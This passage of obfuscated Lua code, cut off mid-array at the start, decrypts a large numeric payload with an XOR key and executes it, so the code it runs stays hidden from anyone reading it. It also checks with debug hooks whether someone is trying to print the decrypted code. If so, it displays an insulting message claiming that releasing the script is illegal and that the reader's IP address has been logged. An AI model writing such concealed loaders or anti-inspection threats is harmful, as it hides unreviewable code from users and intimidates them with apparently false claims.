  979, 789, 1207, 988, 738, 907, 1038, 1116, 593, 642, 1178, 855, 1104, 723, 1195, 1161, 939, 966, 633, 622, 1105, 779,
  641, 572, 1166, 912, 564, 945, 1001, 1205, 1169, 932, 1111, 759, 758, 597, 837, 609, 708, 951, 618, 845, 632, 605,
  1183, 843, 815, 1122, 1052, 1118, 769, 1133, 600, 968, 635, 1047, 880, 805, 946, 1174, 1121, 1095, 1199, 628, 658, 558,
  936, 643, 548, 1156, 931, 847, 808, 662, 889, 1042, 705, 830, 557, 1098, 892, 1112, 1005, 849, 1102, 721, 592, 582,
  1134, 750, 626, 1040, 860, 876, 918, 671, 1044, 1182, 778, 1069, 1024, 952, 1043, 1020, 740, 890, 803, 546, 894, 1000,
  571, 1023, 563, 776, 806, 834, 771, 775, 1137, 594, 1119, 925, 575, 1206, 1165, 1154, 544, 555, 677, 1060, 1187, 911,
  669, 792, 1033, 730, 796, 1123, 1173, 1117, 949, 1066, 1151, 896, 922, 1127, 840, 639, 934, 701, 1146, 1063, 998, 839,
  1002, 955, 1089, 915, 543, 1191, 879, 549, 858, 1200, 1197, 1171, 862, 782, 1194, 801, 1143, 1158, 726, 691, 965, 833,
  788, 1147, 827, 986, 924, 693, 935, 767, 976, 744, 617, 875, 654, 601, 899, 1058, 850, 583, 921, 1056, 737, 832, 653,
  1157, 906, 804, 652, 554, 742, 973, 589, 621, 971, 991, 835, 1032, 1067, 877, 579, 668, 985, 853, 812, 914, 773, 733,
  569, 736, 897, 908, 963, 800, 634, 944, 1130, 770, 1148, 1065, 602, 1011, 798, 867, 954, 940, 695, 576, 720, 741, 1186,
  1101, 1004, 829, 1019, 950, 1192, 1035, 679, 1135, 1037, 568, 688, 1086, 905, 1088, 1096, 684, 1150, 1046, 734, 823,
  1126, 861, 625, 710, 948, 836, 1204, 974, 1208, 1074, 764, 1054, 590, 712, 1184, 941, 819, 910, 842, 799, 1113, 722,
  749, 999, 1196, 659, 831, 1141, 1030, 1064, 874, 731, 927, 550, 869, 1083, 719, 919, 961, 606, 578, 612, 613, 1179,
  1049, 811, 780, 1094, 1185, 608, 791, 547, 851, 768, 681, 1175, 690, 881, 697, 1028, 980, 1142, 886, 1203, 615, 1077,
  794, 1072, 711, 981, 551, 585, 616, 567, 587, 1008, 717, 698, 709, 993, 1007, 660, 1176, 702, 787, 962, 1128, 1061,
  676, 1181, 846, 926, 893, 637, 1163, 703, 580, 870, 596, 562, 1125, 1106, 664, 1021, 1076, 650, 1080, 895, 983, 943,
  1145, 904, 1124, 1018, 651, 747, 1073, 1103, 990, 903, 987, 1078, 766, 1170, 645, 678, 754, 1025, 838, 683, 694, 631,
  559, 802, 1139, 1107, 1055, 765, 992, 603, 623, 1110, 1159, 1211, -1, 53, 4, 110, 58, 93, 93, 19, 26, 71, 25, 26, 77,
  35, 3, 73, 82, 40, 132, 96, 8, 79, 66, 159, 195, 108, 77, 106, 138, 4, 113, 50, 203, 6, 25, 101, 60, 31, 79, 1, 84, 71,
  79, 77, 218, 113, 121, 9, 72, 82, 77, 4, 97, 31, 0, 4, 235, 33, 92, 92, 69, 103, 20, 101, 23, 126, 57, 25, 42, 47, 9,
  2, 77, 24, 76, 70, 115, 60, 18, 68, 69, 102, 229, 21, 119, 78, 6, 36, 128, 126, 75, 77, 115, 125, 65, 77, 46, 58, 59,
  75, 94, 105, 85, 69, 45, 17, 3, 42, 25, 68, 115, 76, 31, 98, 36, 0, 111, 19, 16, 193, 74, 180, 74, 109, 21, 189, 92,
  127, 6, 44, 87, 87, 123, 47, 8, 29, 3, 12, 12, 14, 234, 19, 20, 199, 56, 86, 11, 106, 2, 32, 55, 68, 80, 87, 15, 127,
  19, 151, 138, 19, 21, 118, 18, 87, 18, 165, 112, 87, 68, 19, 90, 110, 38, 90, 190, 74, 166, 76, 77, 16, 70, 28, 80,
  106, 24, 8, 128, 57, 94, 21, 71, 85, 4, 15, 110, 64, 70, 218, 21, 16, 71, 78, 63, 57, 127, 42, 25, 113, 63, 81, 232,
  44, 63, 178, 31, 15, 94, 30, 24, 17, 75, 39, 4, 82, 79, 3, 23, 72, 57, 39, 181, 119, 176, 79, 88, 14, 60, 74, 69, 150,
  21, 45, 211, 156, 77, 119, 123, 20, 10, 3, 40, 9, 49, 71, 88, 21, 113, 110, 84, 0, 100, 52, 84, 11, 23, 74, 127, 92,
  39, 74, 67, 70, 16, 107, 124, 106, 119, 71, 77, 101, 116, 19, 9, 99, 3, 21, 106, 85, 67, 87, 110, 26, 65, 41, 82, 68,
  70, 38, 9, 12, 0, 71, 139, 124, 74, 83, 93, 20, 6, 16, 20, 58, 76, 69, 179, 126, 89, 35, 106, 92, 79, 14, 84, 250, 6,
  108, 61, 46, 68, 92, 54, 129, 67, 19, 110, 71, 123, 72, 89, 71, 116, 199, 228, 24, 24, 216, 79, 85, 52, 234, 98, 115,
  31, 16, 19, 76, 2, 12, 214, 35, 76, 68, 26, 27, 74, 19, 105, 3, 50, 1, 81, 174, 21, 15, 77, 136, 60, 116, 25, 36, 35,
  199, 67, 32, 84, 52, 134, 74, 93, 88, 20, 5, 69, 17, 102, 144, 65, 68, 57, 68, 113, 21, 77, 74, 66, 97, 89, 22, 110,
  68, 30, 45, 77, 20, 200, 11, 108, 24, 94, 74, 85, 74, 17, 5, 50, 2, 65, 123, 63, 17, 146, 63, 20, 6, 41, 3, 3, 10, 47,
  51, 124, 67, 140, 3, 36, 109, 32, 170, 54, 3, 109, 25, 241, 194, 67, 224, 73, 107, 86, 118, 7, 65, 119, 88, 76, 77,
  107, 1, 72, 91, 252, 86, 97, 61, 34, 31, 42, 106, 16, 19, 9, 17, 10, 47, 185, 136, 25, 217, 77, 115, 63, 5, 15, 105, 1,
  33, 1, 106, 85, 62, 101, 27, 24, 105, 34, 108, 55, 65, 64, 160, 64, 157, 97, 119, 92, 74, 84, 74, 13, 32, 6, 25, 16, 1,
  71, 74, 113, 31, 90, 21, 20, 5, 45, 3, 87, 78, 118, 151, 77, 9, 61, 43, 8, 161, 51, 222, 16, 90, 110, 5, 30, 38, 21,
  23, 0, 45, 65, 25, 7, 21, 10, 16, 54, 103, 65, 25, 69, 11, 44, 91, 122, 69, 92, 3, 25, 83, 122, 10, 68, 65, 92, 74, 43,
  53, 3, 34, 47, 79, 4, 143, 23, 86, 12, 27, 83, 101, 85, 68, 52, 25, 58, 36, 8, 59, 54, 8, 11, 254, 113, 50, 63, 108, 8,
  4, 113, 105, 45, 4, 30, 61, 78, 71, 24, 32, 93, 222, 106, 92, 68, 70, 41, 8, 30, 88, 67, 49, 67, 118, 111, 67, 18, 77,
  113, 37, 67, 11, 220, 115, 0, 118, 76, 155, 49, 56, 74, 77, 121, 81, 23, 88, 0, 44, 58, 126, 17, 113, 62, 93, 36, 16,
  245 }, "odefQKj3w9m0c5WuJNlIjtSmgV"); uWHj51uOzgF9nLcSIGa7xyQ5CyXT1pKTVOSC4kJvHPNR7PUS5qHYshnuCvCDYZNkVYC3s3GKPWY =
gWbiWbuDSSULLhUH5bkVmPhe47lZWjnq1rkbwZXhZnFx0AxV3ulYFt3L; nzDC5ic7W7ejMJAc3GEik00BrcnCviVK4wlvnyiYioM65cjUgcyvcR57vjsEvZ1dP87jK =
gWbiWbuDSSULLhUH5bkVmPhe47lZWjnq1rkbwZXhZnFx0AxV3ulYFt3L; qjwARiCjtzEWIadmemcwNhg5LbuuHKMpMFixcPDjTHNv3r8t0DoDm6u =
nzDC5ic7W7ejMJAc3GEik00BrcnCviVK4wlvnyiYioM65cjUgcyvcR57vjsEvZ1dP87jK; ekXW8MpTS3SiT2s9rqnWySx6jG9aPZev5POSODxj0Tm4QtvHz5rhk1GCr6 =
qjwARiCjtzEWIadmemcwNhg5LbuuHKMpMFixcPDjTHNv3r8t0DoDm6u; aj9aRx8Uh5AaCI6QWyo0zgxWt1YYiS6HvNL9GP6NpV2mn0ppuRAqvX =
ekXW8MpTS3SiT2s9rqnWySx6jG9aPZev5POSODxj0Tm4QtvHz5rhk1GCr6; aNvaNKeOAccGjJTwQAGyuLMDjwTxZpOfDtVoxLKmE6fdXWC3xkSm7DKHqyH3oIqs9LysIs =
aj9aRx8Uh5AaCI6QWyo0zgxWt1YYiS6HvNL9GP6NpV2mn0ppuRAqvX; l6lgtkIMDxiIug588fkdn0SM9MZ6rmgOxl2ESyuRzT3760jbgYY =
aNvaNKeOAccGjJTwQAGyuLMDjwTxZpOfDtVoxLKmE6fdXWC3xkSm7DKHqyH3oIqs9LysIs; tidN96fmTFgE1md3IdSY58XPNAJPUZrBkR7YMbAqCwgNS5DD4zfuE =
l6lgtkIMDxiIug588fkdn0SM9MZ6rmgOxl2ESyuRzT3760jbgYY; uRNuxN08R9WWsCojrcqD2XKXEb1J93crvmRBDOUs5qa7p7mT2CyqWS0UJucwp1MCcJ2aH0 =
tidN96fmTFgE1md3IdSY58XPNAJPUZrBkR7YMbAqCwgNS5DD4zfuE; rKhggcdz3UvUY4HCcBEqbFeqYU3CFpydOhQGflHJyWv3BElwwqNIcFxIcqBBhiDXAD6SKydir =
uRNuxN08R9WWsCojrcqD2XKXEb1J93crvmRBDOUs5qa7p7mT2CyqWS0UJucwp1MCcJ2aH0; s6DhN7iw3Id88Xy4TZUgU44alvOfJrMfYlMLl3hhyYKnXRZezdmWMnrSXupHzwqf =
rKhggcdz3UvUY4HCcBEqbFeqYU3CFpydOhQGflHJyWv3BElwwqNIcFxIcqBBhiDXAD6SKydir; jjluxSfJBbU21oCI3V3RFy1NeuECovGpp7n27ZgR5ERb9mE8MJiMPFxhRlHmZT4KrgMMIfUydQx =
s6DhN7iw3Id88Xy4TZUgU44alvOfJrMfYlMLl3hhyYKnXRZezdmWMnrSXupHzwqf; yuWnPq8OHjv2gDc5VyZijT0NPMJ8WSO3Mcfz2K5Fq3lJVUtVyeINenKai8Xv7pB3kV5ypdhGN =
jjluxSfJBbU21oCI3V3RFy1NeuECovGpp7n27ZgR5ERb9mE8MJiMPFxhRlHmZT4KrgMMIfUydQx; vU0BlBfKrpcNocxogwaxdNxrA42C8vP6PKC1P0ToAN3G3LwtyiHIHovmdYT2AFWKMHf =
yuWnPq8OHjv2gDc5VyZijT0NPMJ8WSO3Mcfz2K5Fq3lJVUtVyeINenKai8Xv7pB3kV5ypdhGN; k9JOHBOzdvFhPvi6qJP7k8o5HVT8DrELTGD3IbQ3cUzNACqAjEv4X =
vU0BlBfKrpcNocxogwaxdNxrA42C8vP6PKC1P0ToAN3G3LwtyiHIHovmdYT2AFWKMHf; eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a = function(
  a)
  K, F = 6618882168091334, 16384 + 4130; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; n82CqNJHocun4Ld5M4wfHWP6S16nM43o8B1rfWFRiG11AITZuL3KFpVUsx3ytmb = function(b)
  co = coroutine.create(b)
  naw4LxXJWe8MBYxd2lS7XgXhMVcmUZlJVugjiZfyQtGgzmMcr8oPDPsGx = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(naw4LxXJWe8MBYxd2lS7XgXhMVcmUZlJVugjiZfyQtGgzmMcr8oPDPsGx, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return naw4LxXJWe8MBYxd2lS7XgXhMVcmUZlJVugjiZfyQtGgzmMcr8oPDPsGx
end; pL63rnNFyfpt4Mtgn77Y319AFD4ZokdmYIOrSAVdAls6zfOlg9n = function(f, g)
  c4h5O0eThnWnSGldFdPyx55d9lHlMWYJjU1T7Kqxqk8ej5rvvR80TVvY1kOsS = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; xZEkESen28S0tZsdlTUS5wdkjeVvJvq2hLo3FHMXYrD63Jcl56fEK = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; qa3JEcE1xhHAtrmEjoeWxVtW4txN0fB31rMP7KfrIf9uwTNKcnx29m76mWW8i = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      c4h5O0eThnWnSGldFdPyx55d9lHlMWYJjU1T7Kqxqk8ej5rvvR80TVvY1kOsS(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; yLZjGFytYccjLAMeAzAYh3TOHG1udQ5MnzBt7w09OxPzayFga9w6Vx5Sce0kI = function(p, n)
    llHrq3YOXT63Kk0TFOy4HkPxEeCUe8BRCjulATW1Yi3JdWihSzAdKo5sCFASiTW = ""
    for k, q in pairs(p) do llHrq3YOXT63Kk0TFOy4HkPxEeCUe8BRCjulATW1Yi3JdWihSzAdKo5sCFASiTW =
      llHrq3YOXT63Kk0TFOy4HkPxEeCUe8BRCjulATW1Yi3JdWihSzAdKo5sCFASiTW ..
      k9JOHBOzdvFhPvi6qJP7k8o5HVT8DrELTGD3IbQ3cUzNACqAjEv4X
      [eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('71') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('50') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('92') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('BB') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('16') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('FD')]
      [eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('81') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('DC') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('C3') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('92')](
      q) end
    ; n(llHrq3YOXT63Kk0TFOy4HkPxEeCUe8BRCjulATW1Yi3JdWihSzAdKo5sCFASiTW)
  end; xZEkESen28S0tZsdlTUS5wdkjeVvJvq2hLo3FHMXYrD63Jcl56fEK(f,
    function(r) qa3JEcE1xhHAtrmEjoeWxVtW4txN0fB31rMP7KfrIf9uwTNKcnx29m76mWW8i(r, g,
        function(s) yLZjGFytYccjLAMeAzAYh3TOHG1udQ5MnzBt7w09OxPzayFga9w6Vx5Sce0kI(s,
            function(t) if #n82CqNJHocun4Ld5M4wfHWP6S16nM43o8B1rfWFRiG11AITZuL3KFpVUsx3ytmb(k9JOHBOzdvFhPvi6qJP7k8o5HVT8DrELTGD3IbQ3cUzNACqAjEv4X[eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('58') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('F5') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('C3') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('60')]) == 1 then if k9JOHBOzdvFhPvi6qJP7k8o5HVT8DrELTGD3IbQ3cUzNACqAjEv4X[eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('58') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('F5') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('C3') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('60')] == k9JOHBOzdvFhPvi6qJP7k8o5HVT8DrELTGD3IbQ3cUzNACqAjEv4X[eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('D4') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('92') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('BB') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('16') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('50')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if k9JOHBOzdvFhPvi6qJP7k8o5HVT8DrELTGD3IbQ3cUzNACqAjEv4X[eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('58') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('F5') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('C3') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('60')](t) then
                    k9JOHBOzdvFhPvi6qJP7k8o5HVT8DrELTGD3IbQ3cUzNACqAjEv4X
                        [eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('58') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('F5') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('C3') .. eesxBB6rvYHp2kT5WJy0BeocNmHSaekvSvMdEZmgLWK2RfgRNPVuvmGcfFHepDYLmH6a('60')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; pL63rnNFyfpt4Mtgn77Y319AFD4ZokdmYIOrSAVdAls6zfOlg9n(
{ 993, 567, 1016, 543, 784, 662, 852, 769, 858, 847, 694, 958, 607, 945, 765, 625, 1203, 880, 963, 692, 893, 1061, 980,
  882, 826, 836, 651, 886, 595, 992, 1012, 1198, 1188, 754, 1015, 594, 669, 722, 712, 976, 721, 1027, 1181, 611, 649,
  555, 942, 1037, 951, 1033, 1091, 909, 593, 908, 1202, 916, 811, 917, 1000, 1191, 545, 885, 766, 702, 1166, 940, 579,
  922, 552, 979, 1131, 1164, 1014, 853, 934, 991, 1020, 775, 787, 589, 989, 644, 799, 716, 887, 805, 902, 671, 1018, 675,
  794, 565, 1070, 641, 733, 1130, 726, 957, 740, 1059, 725, 679, 628, 961, 785, 639, 693, 711, 624, 746, 930, 814, 990,
  618, 786, 636, 954, 790, 1117, 1003, 932, 1026, 1143, 896, 1199, 1062, 997, 1089, 1158, 844, 1116, 1153, 640, 730, 660,
  547, 1066, 588, 857, 1205, 680, 983, 924, 791, 690, 688, 750, 842, 696, 1190, 713, 1094, 621, 1080, 724, 1184, 771,
  850, 875, 1043, 568, 667, 705, 928, 559, 1051, 1121, 841, 1029, 1171, 709, 561, 904, 867, 988, 1044, 1194, 1076, 672,
  586, 1208, 1157, 861, 1174, 1172, 1053, 739, 550, 610, 938, 643, 1133, 1073, 1160, 855, 599, 767, 571, 682, 1125, 998,
  1170, 846, 601, 1113, 548, 737, 845, 1169, 1002, 1001, 569, 614, 619, 691, 856, 1039, 698, 758, 1017, 941, 734, 843,
  735, 899, 1013, 1195, 720, 1150, 676, 557, 1023, 995, 1120, 1152, 1096, 1065, 1083, 936, 898, 743, 581, 661, 650, 1004,
  1055, 706, 584, 770, 1084, 972, 1201, 923, 1132, 1058, 821, 889, 779, 985, 1092, 544, 969, 1056, 1078, 655, 1128, 1146,
  656, 756, 1115, 1049, 585, 626, 1107, 953, 600, 657, 577, 1054, 563, 707, 551, 907, 823, 879, 809, 1175, 684, 929, 687,
  801, 1144, 1086, 789, 1098, 982, 952, 894, 654, 837, 1118, 848, 905, 673, 797, 878, 874, 1006, 1179, 862, 761, 645,
  835, 590, 566, 1041, 1034, 748, 884, 1005, 1136, 759, 869, 1052, 597, 574, 570, 1193, 1126, 1103, 807, 987, 996, 617,
  966, 710, 1038, 1072, 1024, 783, 703, 1082, 638, 1025, 1060, 1119, 849, 678, 819, 804, 1022, 1011, 840, 944, 1148, 612,
  1077, 582, 1180, 1155, 971, 622, 666, 1124, 689, 925, 900, 1149, 773, 830, 978, 1085, 890, 1167, 575, 752, 859, 1057,
  749, 560, 1209, 1032, 895, 914, 1200, 833, 1008, 652, 818, 973, 634, 1100, 1109, 642, 1040, 763, 1176, 1036, 686, 970,
  827, 984, 1183, 1079, 1019, 629, 727, 635, 824, 777, 946, 1114, 1162, 1206, 1063, 828, 1189, 974, 583, 808, 697, 747,
  816, 744, 564, 910, 1087, 1101, 768, 959, 860, 943, 921, 1105, 806, 609, 864, 863, 825, 795, 723, 1031, 596, 613, 1123,
  592, 1140, 967, 897, 699, 901, 838, 876, 1108, 762, 1111, 717, 994, 1102, 1104, 755, 1163, 832, 616, 674, 933, 918,
  1095, 892, 1097, 1064, 1035, 663, 665, 1045, 632, 646, 903, 986, 1196, 708, 1007, 960, 1212, 796, 591, 912, 1127, 549,
  1129, 1168, 812, 1090, 870, 931, 608, 964, 1081, 576, 927, 792, 603, 701, 803, 780, 1106, 1156, 782, 715, 956, 1185,
  839, 1197, 868, 760, 604, 947, 664, 683, 658, 881, 926, 873, 753, 788, 1075, 977, 546, 906, 888, 802, 606, 1182, 1165,
  968, 1187, 1154, 1145, 920, 602, 605, 774, -1, 69, 4, 17, 117, 28, 98, 108, 80, 6, 72, 77, 105, 30, 96, 8, 65, 84, 70,
  87, 81, 69, 88, 89, 76, 99, 111, 16, 27, 65, 164, 155, 11, 115, 44, 11, 30, 1, 243, 48, 22, 24, 13, 52, 116, 207, 117,
  95, 19, 9, 68, 86, 6, 86, 88, 33, 233, 74, 0, 70, 83, 117, 5, 34, 3, 22, 19, 11, 118, 4, 71, 29, 123, 169, 91, 65, 69,
  70, 210, 83, 101, 233, 104, 19, 49, 175, 43, 7, 172, 84, 117, 162, 2, 4, 52, 149, 48, 84, 87, 78, 69, 77, 23, 33, 88,
  246, 135, 1, 77, 31, 101, 5, 104, 102, 56, 1, 115, 172, 104, 11, 24, 104, 108, 87, 38, 66, 77, 49, 161, 22, 95, 4, 5,
  59, 7, 107, 0, 101, 58, 220, 68, 79, 67, 201, 12, 94, 15, 18, 9, 119, 11, 81, 39, 106, 75, 104, 76, 59, 48, 88, 119,
  76, 34, 115, 48, 99, 100, 79, 101, 81, 78, 107, 63, 4, 24, 64, 127, 45, 83, 72, 126, 32, 105, 29, 67, 28, 150, 66, 69,
  178, 39, 79, 115, 70, 177, 119, 187, 100, 60, 122, 0, 48, 117, 83, 17, 87, 3, 72, 26, 235, 119, 82, 121, 23, 87, 68,
  115, 0, 35, 55, 37, 30, 89, 25, 52, 80, 100, 56, 24, 68, 133, 104, 5, 116, 23, 30, 63, 32, 115, 2, 89, 19, 46, 86, 32,
  6, 38, 117, 16, 9, 101, 190, 40, 33, 13, 23, 5, 38, 70, 44, 22, 69, 93, 39, 67, 67, 23, 35, 195, 58, 101, 171, 48, 40,
  101, 134, 41, 61, 242, 4, 53, 49, 11, 8, 38, 43, 55, 173, 80, 242, 62, 14, 229, 90, 39, 89, 75, 3, 72, 99, 20, 72, 89,
  96, 126, 17, 19, 16, 6, 175, 55, 94, 250, 118, 114, 14, 48, 100, 11, 81, 32, 2, 108, 55, 233, 85, 85, 50, 115, 255,
  227, 24, 35, 31, 48, 174, 95, 107, 20, 86, 43, 15, 105, 11, 92, 101, 34, 20, 88, 65, 94, 108, 33, 67, 17, 44, 6, 72,
  24, 31, 29, 69, 81, 6, 95, 2, 70, 42, 69, 204, 7, 143, 22, 1, 84, 22, 49, 209, 105, 12, 21, 5, 100, 86, 19, 125, 114,
  7, 55, 86, 72, 60, 64, 136, 45, 209, 109, 121, 17, 43, 107, 9, 70, 28, 110, 2, 103, 7, 73, 8, 115, 13, 54, 246, 9, 17,
  39, 89, 72, 60, 163, 67, 93, 129, 71, 5, 72, 90, 0, 71, 71, 54, 57, 196, 89, 105, 98, 4, 18, 167, 75, 57, 35, 38, 115,
  22, 68, 66, 29, 105, 31, 124, 10, 40, 108, 2, 82, 66, 38, 20, 20, 18, 113, 117, 15, 89, 21, 108, 125, 89, 61, 71, 41,
  88, 93, 51, 54, 5, 101, 59, 100, 55, 16, 3, 90, 70, 212, 99, 200, 115, 71, 41, 48, 61, 117, 13, 101, 5, 104, 82, 240,
  27, 26, 101, 23, 56, 205, 54, 54, 66, 51, 16, 6, 63, 86, 89, 32, 13, 101, 7, 107, 101, 17, 72, 105, 64, 101, 237, 85,
  145, 58, 127, 198, 19, 82, 67, 80, 30, 98, 89, 82, 101, 92, 95, 103, 115, 107, 43, 101, 101, 38, 32, 80, 54, 71, 26,
  86, 207, 71, 119, 13, 71, 19, 2, 119, 11, 63, 93, 228, 11, 184, 75, 79, 22, 124, 24, 14, 33, 27, 96, 113, 24, 60, 64,
  98, 60, 20, 65, 75, 12, 95, 66, 222, 62, 16, 17, 211, 66, 60, 101, 87, 75, 74, 78, 42, 103, 72, 10, 62, 161, 2, 85, 79,
  65, 100, 127, 33, 40, 112, 14, 69, 83, 82, 85, 48, 69, 71, 78, 14, 85, 1, 166, 1, 30, 43, 108, 219, 79, 108, 72, 99,
  126, 116, 9, 44, 65, 41, 25, 77, 62, 139, 79, 107, 51, 119, 75, 5, 101, 42, 72, 24, 13, 119, 69, 108, 49, 98, 72, 85,
